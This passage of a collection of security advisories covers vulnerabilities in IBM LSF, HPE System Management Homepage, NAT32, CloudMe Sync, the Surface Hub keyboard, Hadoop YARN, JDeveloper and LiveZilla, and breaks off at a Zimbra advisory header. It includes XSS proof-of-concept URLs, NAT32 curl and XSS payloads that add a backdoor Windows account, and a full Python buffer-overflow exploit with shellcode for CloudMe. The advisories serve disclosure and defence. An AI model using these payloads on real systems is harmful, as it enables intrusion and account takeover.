wftOZRzX1jjIGqMljqpXrzjAbKuSWgeaR7WQELuzsymKJLYAxFLpYqxKQEEQtjB6
DCyZt5mJQTMGhKimsmHdm7lhicstSiGNTwPp8w7KRsAO9yUM66QDK+6PyzbyG6sz
zTA1rTtQGdHgHtWjyfWO+nqTjmIYUApGeZMcsAcuQyqNqJxbwWCUcwoKAcUbVnr4
znHLsNYZpNH4lbXAQudqiILNEQMiKAUMDCbp+NiQdNtdkzyoBAin4BblJrWGrMIE
8REZhtG/LWstaopB06AGLCWd58KQLK2qcRYXQzMYWQxwJAQaiBNaObMSGgcyJR+c
UQWLwGT3WHgN62HQIvQVXLKTjCbfzrGwdm5WvivXXVBQB6IRYKiZBMFjASTE1JTk
m+dB5d4aGO4J+CY6GOxJZvm9zPxEU3Q0Bnm5DnRuisYlPQRJ6NxTPDBDQSiWfS92
+GMEZ4YPRoJJN+gbZGr2qCwm/BLM+NX1JEY3yFiEZ0ri09vJ4zghtRM9c3u2SxLX
j0KXEFkWHFQLOLFqn1vt9FuCsgyc8EcZXD4xBNLUnTF96M7CMAz5R1xZsQ/2xBRf
2WfYnSmp/VL6pvXhD3WKrf+g+Ou9afnAnrIPv5ra6Cn/YV/NV5+uvXr0rtrpo1/v
OXXP8ZY7Gypevuedu8vI0oMFLWt29H2wdsSlwQUteemP/TI8u7lLOX9KPTZsZ+He
ZwYXVpxDD3x9tujKtd9OdDRvK/xj1jrj9JBlke2+w+Stc1tw64a6oZ4b7RNdrpYO
saJ/Xl1e2V8lRZsPbW1bwibIox9u2eJc/VHzqcvHFmXdONm09t2bWzI6X5q/OW1h
WtfkPd+9oW/OHDl8yb4/v1nTPfv9002+P7PIidVH5t+1e1r3lf0fjm0/Upn593vp
HRddkU8avn7ls8ync3xKnrDUGPUTcU9NGbXoUu6J1Z030y7Yv1//+xPpK9t8ubsH
9Ez4bdT0pn3+XZEjP4+adfnHV7/c+W3nuXVzjt0vCU2f958rDsqd19btNaZfb390
zth+uzrbVi6ac2BgyJZZPHLB6YX5DelXWnM3jOnTcejM9av3nfrmiQk7om//lHk4
NLRVOfpxuz5be/z3ATMG3lu46/Urzz7fGNn33tHrX2z7dEHzwe6GkU/2GdrV7+8H
JPsecVbPyYKqP4pbX3DPXtFynO5u/Ln97JBxA8hCdljsnlm7qq4h+NqtIbjnJW/K
5j0j1s1M3dTy5aDsFxvPTu12HEiVm9ann/hs/5E6efibYe/WAeHzn4y+EPn1+IUu
17IFtzZOY9v9l/aPvu/W0L7Gira911rdL47fuJwtOvz91h8eXnV5WGO475PT/gE=
=nyj5
-----END PGP MESSAGE-----"
1271,[CVE-2017-1205] IBM Spectrum LSF Privilege Escalation,,CVE-2017-1205,"###[IBM Spectrum LSF Privilege Escalation]###
* Software: IBM Spectrum LSF
* Affected Versions: IBM Spectrum LSF 8.3, 9.1.1, 9.1.2, 9.1.3, 10.1, 10.1.0.1
* CVE Reference: CVE-2017-1205
* Author: John Fitzpatrick (@j0hn__f)
* Severity: CVSS 9.3
* Vendor: IBM
* Vendor Response: Fixes provided
* Date: 2018-03-16
### Description
A vulnerability was identified within IBM Spectrum LSF which made it was possible to impersonate other users when submitting jobs for execution. Additionally, it was found to be possible to impersonate and execute jobs as root, even where root job submission is disabled.
### Impact
This vulnerability allows for arbitrary code execution as any user of the LSF cluster, including as root. Exploitation should only be possible from hosts listed within lsf.cluster.cluster_name, which typically will include all hosts that form part of the cluster. However, some cluster use cases may be more open using ranges or wildcards; thus, exposure may extend beyond those with cluster access.
### Cause
This issue arises as a result of series of security oversights within LSF�s authentication mechanism:
1. A hardcoded key embedded within the eauth binary, which is shared across all LSF installations, makes it possible for anyone with a copy of eauth to generate authentication tokens for any user in a default installation.
2. Even where eauth is configured to use an external key (non-default), overriding getuid() results in the ability to generate authentication tokens as other users.
3. On receiving job requests, LSF performs authentication and authorisation checks against the authentication token, but then proceeds to submit the job for execution against a UID contained elsewhere in the message, which is not validated. It is this behaviour that circumvents controls that prevent root job execution.
### Interim Workaround
Configure eauth to use an external key and set the setuid bit on the eauth binary in order to prevent users from runtime patching the eauth binary.
Details on how to configure eauth to use an external key can be found here: https://www.ibm.com/support/knowledgecenter/en/SSWRJV_10.1.0/lsf_admin/ext_auth_kerb_lsf_about.html
Eauth can be configured with the setuid bit set in the following manner:
# chmod 4755 eauth
The guidance above does not resolve LSF�s failure to validate the UID under which the job is run. However, unless an authentication token is disclosed, or another vulnerabilities exist, it should not be possible for a user to exploit this weakness without already having administrative rights within the cluster.
### Solution
IBM has provided some updates to address these issues, which can be found within their bulletin here:
http://www-01.ibm.com/support/docview.wss?uid=isg3T1025091
These fixes do not configure LSF to utilise an external key which should be done by creating a key and setting LSF_EAUTH_KEY within lsf.sudoers:
https://www.ibm.com/support/knowledgecenter/en/SSETD4_9.1.2/lsf_config_ref/lsf.sudoers.5.html
At the time the updates were provided, they failed to set the setuid bit on eauth and so, failed to actually resolve a core part of the issue. However, the setuid bit is set on eauth by default in the most recent installations and can be set manually. It should be ensured that your eauth uses an external key, is root owned and has the setuid bit set (chmod 4755).
If eauth has been configured to use an external key, but with no setuid bit set, then a new key should be
generated.
### Detailed Timeline
Date Summary
2017-03-28 Issue reported to IBM PSIRT
2017-04-07 IBM report issue resolved, patches and security bulletin released
2017-04-12 Additional technical detail on fixes provided to MWR by IBM PSIRT
2018-03-16 Advisory published by MWR
### Further Information
Further details on eauth and how it works can be found here:
https://www.ibm.com/support/knowledgecenter/en/SSWRJV_10.1.0/lsf_admin/ext_auth_kerb_lsf_about.html
Information on setting up eauth to use an external key:
https://www.ibm.com/support/knowledgecenter/en/SSETD4_9.1.2/lsf_config_ref/lsf.sudoers.5.html
IBM�s security bulletin relating to this issue can be found here:
http://www-01.ibm.com/support/docview.wss?uid=isg3T1025091
The origional copy of this advisory can be found on the MWR Labs website here:
https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-ibm-lsf-priv-esc-2018-03-15.pdf"
1303,CVE-2017-12544 XSS on HPE System Management Homepage v7.6.0.11 and minor,,CVE-2017-12544,"Product: HPE System Management Homepage
Versions: 7.6.0.11 and minor versions
Vulnerability: JavaScript Injection in file gsearch.php, parameter prod
OWASP TOP 10: A1 Injection
Type: Javascript Injection
Impact: Allows an attacker to perform an XSS (Cross-Site Scripting) attack,
execute arbitrary JavaScript client-side, steal admin credentials, etc
Access Vector: Adjacent Networks
Access Complexity: Low
Authentication: None
CVE-2017-12544
Intro
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The HP System Management Homepage (SMH) is a web-based interface that
consolidates and simplifies the management of ProLiant and Integrity servers
running Microsoft Windows or Linux, or HP 9000 and HP Integrity servers
running HP-UX 11i. By aggregating data from HP Insight Management Agents and
other tools, SMH provides a secure and intuitive interface to review
in-depth hardware configuration and status data, performance metrics, system
thresholds and software version control information.
The risk is high because this software is used in HP Windows and Linux
servers. Actually there are many banking clients affected among other
critical industries.
The attacker can trigger this vulnerability without authentication.
There is a JavaScript injection in file gsearch.php.en that affects form
parameter prod sent over GET method, exactly in this line:
var prodName = '<?php echo $prodName; ?>';
That allows arbitrary javascript client-side execution and XSS attacks
because quotes are not escaped, and an attacker is able to inject directly
JavaScript code with optional embedded HTML entities that are executed and
rendered in victim's browser.
Proof of concept
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://192.168.1.103:2381/gsearch.php.en?prod=%27%3beval%28alert%28%22uppps%22%29%29%3b%27
Fix
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var prodName = '<?php echo htmlentities($prodName); ?>';
Credits
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Special thanks to Abelardo Suira for helping me to setup the environment and
HPE for their support fixing the vulnerability.
Jacobo Avariento <spinfoo protonmail com>
http://spinfoo.ninja
Sent with ProtonMail Secure Email."
1342,NAT32 Build (22284) Remote Code Execution CVE-2018-6940 (hyp3rlinx / apparition security),,CVE-2018-6940,"[+] Credits: hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/NAT32-REMOTE-COMMAND-EXECUTION-CVE-2018-6940.txt
[+] ISR: Apparition Security
[-_-] D1rty0tis
Vendor:
=============
www.nat32.com
Product:
=================
NAT32 Build (22284)
NAT32 is a versatile IP Router implemented as a WIN32 application.
Vulnerability Type:
===================
Remote Command Execution
CVE Reference:
==============
CVE-2018-6940
Security Issue:
================
NAT32 listens on Port 8080 for its Web interface.
C:>netstat -ano | findstr 8080
TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 3720
If the 'Password Checking' (BASIC authentication) feature is NOT enabled (user must select it under config tab) then remote attackers who can reach
NAT32 can potentially execute arbitrary commands, if authentication is enabled they will get 'Unauthorized' server reply, however, read on ...
e.g.
Add user account.
C:>curl ""http://x.x.x.x:8080/shell?cmd=run+net+user+D1rty0Tis+abc123+/add""
<!DOCTYPE html>
<html>
<body><pre>run start net user D1rty0Tis abc123 /add Done
</pre></body></html>
If NAT32 'Password Checking' feature IS enabled, remote attackers can STILL potentially issue arbitrary commands exploiting a
Cross Site Scripting vulnerability in the HTTPD code of NAT32, if authenticated NAT32 users click a malicious link
or visit an attacker controlled webpage.
Also worth mentioning, NAT32 implements BASIC authentication which pass BASE64 Encoded credentials which can be easily
revealed if sniffed on network.
When 'Password Checking' is enabled attackers using Ajax calls via XSS would need to use a combination of '%0D%0A' and double encoding
to deal with 'white-space' in order for the payload to stay intact.
%25 for '%' sign then 20 (%2520) = %20, using %20 or %2B will not cut it, however '%0D%0A' (CRLF) and '%2520' encoding serves us well.
NAT32 has an interesting Command 'EXECR' that can allow attackers to capture Command output response from the server to see right away if an
attack was success or not.
e.g.
Add account and get response (EXECR)
HTTP Response:
<!DOCTYPE html>
<html>
<body><pre>The command completed successfully.
execr net user D1rty0Tis abc123 /add Done
</pre></body></html>
The NAT32 'winroute' Command will return host route information.
XSS response
e.g.
<!DOCTYPE html>
<html>
<body><pre>Destination Mask Nexthop Metric IfIndex Type Proto Age
0.0.0.0 0.0.0.0 192.168.1.2 10 b 4 3 21:41 [min:sec]
127.0.0.0 255.0.0.0 127.0.0.1 306 1 3 3 22:04 [min:sec]
127.0.0.1 255.255.255.255 127.0.0.1 306 1 3 3 22:04 [min:sec]
127.255.255.255 255.255.255.255 127.0.0.1 306 1 3 3 22:04 [min:sec]
</pre></body></html>
Exploit/POC:
=============
NET32 Password Checking not enabled...
C:>curl ""http://x.x.x.x:8080/shell?cmd=run+net+user+D1rty0Tis+abc123+/add""
NAT32 BASIC authentication enabled use XSS...
Add backdoor account and capture CMD output using NAT32 'execr' shell command.
http://x.x.x.x:8080/shell?cmd=<script>var%0D%0Axhr=new%0D%0AXMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open('GET','http://x.x.x.x:8080/shell?cmd=execr%2520net%2520user%2520D1rty0Tis%2520abc123%2520/add',true);xhr.send(null);</script>
Get Windows Routes (info disclosure):
http://x.x.x.x:8080/shell?cmd=%3Cscript%3Evar%0D%0Axhr=new%0D%0AXMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open(%27GET%27,%27http://x.x.x.x:8080/shell?cmd=winroute%27,true);xhr.send(null);%3C/script%3E
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=============================
Vendor Notification: February 9, 2018
Vendor acknowledgement: February 9, 2018
Vendor ""I've decided to remove the HTTPD code from Build 22284 of NAT32"" : February 12, 2018
www.nat32.com website reads ""NAT32 Version 2.2 Build 22284 is temporarily unavailable."" : February 13, 2018
February 14, 2018 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1348,CVE-2018-6892 CloudMe Sync <= v1.10.9 Unauthenticated Remote Buffer Overflow (hyp3rlinx / apparition security),,CVE-2018-6892,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CLOUDME-SYNC-UNAUTHENTICATED-REMOTE-BUFFER-OVERFLOW.txt
[+] ISR: Apparition Security
[+] SSD Beyond Security Submission: https://blogs.securiteam.com/index.php/archives/3669
Vendor:
=============
www.cloudme.com
Product:
===========
CloudMe Sync <= v1.10.9
(CloudMe_1109.exe)
hash: 0e83351dbf86562a70d1999df7674aa0
CloudMe is a file storage service operated by CloudMe AB that offers cloud storage, file synchronization and client software.
It features a blue folder that appears on all devices with the same content, all files are synchronized between devices.
Vulnerability Type:
===================
Buffer Overflow
CVE Reference:
==============
CVE-2018-6892
Security Issue:
================
Unauthenticated remote attackers that can connect to the ""CloudMe Sync"" client application listening on port 8888, can send a malicious payload causing
a Buffer Overflow condition. This will result in an attacker controlling the programs execution flow and allowing arbitrary code execution on the victims PC.
CloudMe Sync client creates a socket listening on TCP Port 8888 (0x22B8)
In Qt5Core:
00564DF1 . C74424 04 B822>MOV DWORD PTR SS:[ESP+4],22B8
00564DF9 . 890424 MOV DWORD PTR SS:[ESP],EAX
00564DFC . FF15 B8738100 CALL DWORD PTR DS:[<&Qt5Network._ZN10QTc>; Qt5Netwo._ZN10QTcpServer6listenERK12QHostAddresst
C:>netstat -ano | findstr 8888
TCP 0.0.0.0:8888 0.0.0.0:0 LISTENING 15504
TCP [::]:8888 [::]:0 LISTENING 15504
Buffer Overflow:
================
EIP register will be overwritten at about 1075 bytes.
EAX 00000001
ECX 76F698DA msvcrt.76F698DA
EDX 00350000
EBX 41414141
ESP 0028D470
EBP 41414141
ESI 41414141
EDI 41414141
EIP 41414141
Stack Dump:
==========
(508.524): Access violation - code c0000005 (first/second chance not available)
*** ERROR: Symbol file could not be found. Defaulted to export symbols for ntdll.dll -
eax=00000000 ebx=00000000 ecx=41414141 edx=778f353d esi=00000000 edi=00000000
eip=41414141 esp=00091474 ebp=00091494 iopl=0 nv up ei pl zr na pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246
41414141 ?? ???
Exploitation is very easy as ASLR SafeSEH are all set to false making the exploit portable and able to work across different operating systems.
We will therefore use Structured Exceptional Handler overwrite for our exploit.
e.g.
6FE6909D 0x6fe6909d : pop ebx # pop esi # ret 0x20 | {PAGE_EXECUTE_READ} [libstdc++-6.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:UsersvictimoAppDataLocalProgramsCloudMeCloudMelibstdc++-6.dll)
00476795 0x00476795 : pop ebx # pop esi # ret 0x20 | startnull {PAGE_EXECUTE_READ} [CloudMe.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:UsersvictimoAppDataLocalProgramsCloudMeCloudMeCloudMe.exe)
61E7B7F6 0x61e7b7f6 : pop ebx # pop esi # ret 0x20 | {PAGE_EXECUTE_READ} [Qt5Gui.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.9.0.0 (C:UsersvictimoAppDataLocalProgramsCloudMeCloudMeQt5Gui.dll)
0day Exploit POC:
==============
import socket,struct
print 'CloudMe Sync v1.10.9'
print 'Unauthenticated Remote Buffer Overflow 0day'
print 'Discovery/credits: hyp3rlinx'
print 'apparition security '
#shellcode to pop calc.exe Windows 7 SP1
sc=(""x31xF6x56x64x8Bx76x30x8Bx76x0Cx8Bx76x1Cx8B""
""x6Ex08x8Bx36x8Bx5Dx3Cx8Bx5Cx1Dx78x01xEBx8B""
""x4Bx18x8Bx7Bx20x01xEFx8Bx7Cx8FxFCx01xEFx31""
""xC0x99x32x17x66xC1xCAx01xAEx75xF7x66x81xFA""
""x10xF5xE0xE2x75xCFx8Bx53x24x01xEAx0FxB7x14""
""x4Ax8Bx7Bx1Cx01xEFx03x2Cx97x68x2Ex65x78x65""
""x68x63x61x6Cx63x54x87x04x24x50xFFxD5xCC"")
ip=raw_input('[+] CloudMe Target IP> ')
nseh=""xEBx06""+""x90""*2 #JMP
seh=struct.pack('<L',0x61e7b7f6) #POP,POP RET
junk=""A""*2232+nseh+seh+sc+""B""*5600
payload=junk+nseh+seh+sc
def PwnMe(ip,payload):
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,8888))
s.send(payload)
print 'Sending buffer overflow packetz'
raw_input()
if __name__ == '__main__':
PwnMe(ip,payload)
References:
============
https://www.cloudme.com/en/sync#
https://blogs.securiteam.com/index.php/archives/3669
POC Video URL:
=============
https://vimeo.com/255280060
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=============================
SSD Vulnerability submission: January 17, 2018
Would like to acknowledge Beyond Security�s SSD program for the help with co-ordination of this vulnerability.
More details can be found on their blog at:
https://blogs.securiteam.com/index.php/archives/3669
February 11, 2018 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1379,"[SYSS-2017-026] Microsoft Surface Hub Keyboard - Cryptographic Issues (CWE-310), Insufficient Protection against Replay Attacks",CWE-310,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2017-026
Product: Microsoft Surface Hub Keyboard
Manufacturer: Microsoft
Affected Version(s): n/a
Tested Version(s): n/a
Vulnerability Type: Cryptographic Issues (CWE-310)
Insufficient Protection against Replay Attacks
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2017-10-20
Solution Date: -
Public Disclosure: 2018-01-29
CVE Reference: Not yet assigned
Authors of Advisory: Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
The Microsoft Surface Hub Keyboard is a wireless keyboard that can be
used in combination with the digital whiteboard/collaboration system
Microsoft Surface Hub (see [1]).
Due to an insecure implementation of the encrypted data communication,
the Microsoft Surface Hub Keyboard is vulnerable to replay attacks with
certain restrictions.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH found out that the Microsoft Surface Hub Keyboard Keyboard
is prone to replay attacks with some limitations.
An attacker can sniff the AES-encrypted data packets of the 2.4 GHz
radio communication sent by the keyboard to the receiver (USB dongle)
and replay the recorded communication data causing the same effect as
the original data communication.
According to test results of the SySS GmbH, the Microsoft Surface Hub
Keyboard and its USB dongle have implemented a replay protection based
on an incrementing packet counter. But the used window for valid packet
counter values is large enough to perform a replay attack if there were
not too many data packets caused by further keystrokes between the
attacker's recording and the playback. The same behavior was found in
the previously tested wireless keyboard Microsoft Wireless Desktop 2000
(see [2]).
A replay attack against the keyboard can, for example, be used to gain
unauthorized access to a computer system that is operated with a
vulnerable keyboard. In this attack scenario, an attacker records the
radio communication during a password-based user authentication of his
or her victim, for instance during a login to the operating system or
during unlocking a screen lock. At an opportune moment when the victim's
computer system is unattended, the attacker approaches the victim's
computer and replays the previously recorded AES-encrypted data
communication for the password-based user authentication and by this
gets unauthorized access to the victim's system.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH could successfully perform a replay attack as described in the
previous section using the USB radio dongle Crazyradio PA (see [3]) and
the proof-of-concept software tool simple_replay.py that is part of the
SySS nRF24 Playset (see [4]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
According to information from the manufacturer, the reported security
issue does not meet the requirements for a security patch.
For further information, please contact the manufacturer.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2017-10-20: Vulnerability reported to manufacturer
2017-10-20: Manufacturer acknowledges e-mail with SySS security advisory
2017-11-30: E-mail from manufacturer with open questions
2017-12-01: E-mail to manufacturer concerning open questions
2017-12-08: E-mail from manufacturer with open questions regarding
attack scenarios and preconditions
2017-12-11: E-mail to manufacturer concerning open questions, attack
scenarios, and preconditions
2017-12-11: E-mail from manufacturer that the reported security issue
and its exploitability does not meet the bar for a security
patch
2017-12-13: E-mail to manufacturer explaining - from a SySS point of
view - the feasibility of actual replay attacks that exploit
the reported security vulnerability
2018-01-29: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Microsoft Surface Hub
https://www.microsoft.com/en-us/surface/devices/surface-hub/overview
[2] SySS Security Advisory SYSS-2016-043
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-043.txt
[3] Product website for Crazyradio PA
https://www.bitcraze.io/crazyradio-pa/
[4] SySS nRF24 Playset
https://github.com/SySS-Research/nrf24-playset
[5] SySS Security Advisory SYSS-2017-026
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2017-026.txt
[6] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg of SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: https://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAlpu6bkACgkQ2aS/ajSt
Tav4Jw//TVotf+UMuaZKwU2kaSE4vFob/pEGpRaHBCKQmjda1Tl8vUqwtQC0PkoY
BIhyNelb004YaNAQOblRP61DcZpn1IAbIogVuAxbnol2+1VBJA75jG1FcE8bta5d
uYYwSy5AEt29qo1XYycoxjvf0SlGMzRC5CiOq8RGhzR5jslcTBG+ZR/0In2fKgLr
v5XRRPOLs8mWVIbPpRR+VTJbaTY0V/GVj9z/3hku+h+QsGJuGQ8feTwbxLa4d79d
U96yI2Mnc9t7Yh47xC4IlDxXoKZL1V/P/CZeYAPQh7QKSer9xgs33gnn6KDXcmj3
+ED/6PZnQtHAAoM9NiW+uGifGl0hazHeCX4gP8FjDA/eZHLAJDDU+9yjuv5Bf4v2
4FFY9jq7/eNdzZxxHjZBnjF7tYP5yo8ENiWqwTXNXeZgXy4gxFuaioJdKPgftzX7
TJOh9vqX7Vo3Zv1CaEwP7/eB57T8bftwmwtzRD1ca8wp/L36K0I+KDSbTR908oEU
l9PfUH8b3dMQJWlj+6UB5+JT5GN79SP4q45COTRSaB5epf0LdUH1ACAF88PzaJ5w
iKpFx455sbNoePfe3JUlNzdUW9a1acvdfS8Hm9ySpcpX0hjpIdh8o1eF0bU7OAOI
7xNlt8ed0z+CqAf4tK71/TV4n53jWU/LdNkgIP2yefiGv6x7ZJc=
=8cy6
-----END PGP SIGNATURE-----"
1399,CVE-2017-15718: Apache Hadoop YARN NodeManager vulnerability,,CVE-2017-15718,"CVE-2017-15718: Apache Hadoop YARN NodeManager vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Hadoop 2.7.3, 2.7.4
Description:
In Apache Hadoop 2.7.3 and 2.7.4, the security fix for CVE-2016-3086 is incomplete.
The YARN NodeManager can leak the password for credential store provider
used by the NodeManager to YARN Applications.
If you use the CredentialProvider feature to encrypt passwords used in
NodeManager configs, it may be possible for any Container launched
by that NodeManager to gain access to the encryption password.
The other passwords themselves are not directly exposed.
Mitigation:
2.7.3 and 2.7.4 users should upgrade to 2.7.5.
If you cannot upgrade to the latest version, set the permission of
the jceks file appropriately to restrict access from unauthorized users.
Credit:
This issue was discovered by Vinayakumar B."
1414,Oracle JDeveloper IDE Directory Traversal CVE-2017-10273 (hyp3rlinx / apparition security),,CVE-2017-10273,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/ORACLE-JDEVELOPER-DIRECTORY-TRAVERSAL.txt
[+] ISR: apparition security
Vendor:
=============
www.oracle.com
Product:
===========
JDeveloper IDE
Oracle JDeveloper is a free integrated development environment that simplifies the development of Java-based
applications addressing every step of the application lifecycle.
Vulnerability Type:
===================
Directory Traversal
CVE Reference:
==============
CVE-2017-10273
Security Issue:
================
Attackers can place malicious files outside intended target directories if tricked into importing corrupt .WAR or .EAR archives.
Later, attackers can potentially request these scripts/files to execute system commands on affected target.
Affected versions:
11.1.1.7.0, 11.1.1.7.1, 11.1.1.9.0, 11.1.2.4.0, 12.1.3.0.0, 12.2.1.2.0
References:
============
http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html
Exploit/POC:
=============
1) create evil .WAR or .EAR archive containing ../ in path name to initiate directory traversal and inside a script to execute system commands.
2) import into JDeveloper
3) files get moved outside target directories to one of the attackers choosing.
4) attacker requests the malicious file contained in target directory.
BAM!
Network Access:
===============
Local
Severity:
=========
Low
Disclosure Timeline:
=============================
Vendor Notification: October 14, 2016
Vendor fixes as part of CPU January 16, 2018
January 17, 2018 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1426,ADVISORY - LiveZilla - Cross-site scripting (XSS) vulnerability in knowledgebase.php - CVE-2017-15869,,CVE-2017-15869,"1. ADVISORY SUMMARY
LiveZilla - Cross-site scripting (XSS) vulnerability in knowledgebase.php
Risk: Medium
Application: LiveZilla
Versions Affected: 7.0.6.0
Vendor: LiveZilla GmbH
Vendor URL: https://www.livezilla.net/
Sent to vendor: 04.12.2017
Vendor response: Acknowledge 04.12.2017
Published fixed Release by vendor: 15.12.2017 (7.0.8.9)
Date of Public Advisory: 16.01.2018
Advisory URL: https://www.pallas.com/advisories/cve-2017-15869-livezilla-xss-knowledgebase
Author: Tim Kretschmann (Pallas GmbH)
Version and State of report: 1.0 (16.01.2018) - published
2. VULNERABILITY INFORMATION
A cross-site scripting (XSS) vulnerability in knowledgebase.php in LiveZilla 7.0.6.0 allow remote attackers to inject arbitrary web script or HTML via the search-for parameter.
Remotely Exploitable: Yes
Locally Exploitable: No
CVE: CVE-2017-15869
CVSS Base Score v2: 6.1 / 10
CVSS Base Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
3. VULNERABILITY DESCRIPTION
A cross-site scripting (XSS) vulnerability in knowledgebase.php in LiveZilla 7.0.6.0 allow remote attackers to inject arbitrary web script or HTML via the search-for parameter.
4. SOLUTIONS AND WORKAROUNDS
Update to Release 7.0.8.9 or higher (Dec 2017)
No possible workaround before 7.0.8.9
5. AUTHOR
Tim Kretschmann (Pallas GmbH)
6. TECHNICAL DESCRIPTION / PROOF OF CONCEPT (PoC)
Attack Vector:
/knowledgebase.php?entry=show&searchfor=ae2w1%22onfocus%3d%22alert(1)%22autofocus%3d%22bvofh&article=<IfOfArticle>
7. TIMELINE
04.12.2017 - E-Mail with Bug Information to LiveZilla
04.12.2017 - Acknowledged the bug
15.12.2017 � LiveZilla published Release 7.0.8.9 (see https://www.livezilla.net/changelog/en/)
16.01.2018 � Pallas published Advisory
8. ABOUT PALLAS GMBH
Pallas provides security consulting, pentesting, managed security services and hosting services with focus on security.
Adress: Pallas GmbH, Hermuelheimer Strasse 8a, 50321 Bruehl, GERMANY
Phone: 0049.2232.18960
Fax: 0049.2232.198629
Web: https://www.pallas.com/"
1452,CVE-2017-8802 Zimbra Collaboration Suite - Stored Cross-Site Scripting,,CVE-2017-8802,"####################################################################################################
#
# COMPASS SECURITY ADVISORY https://www.compass-security.com
####################################################################################################
#
# CVE ID : CVE-2017-8802
# Product: Zimbra Collaboration Suite (ZCS) [1]
# Vendor: Synacor Inc. [2]
# Subject: Stored Cross-Site Scripting (XSS) Vulnerability
# Risk: High
# Effect: Exploitable by Anonymous Internet Adversaries
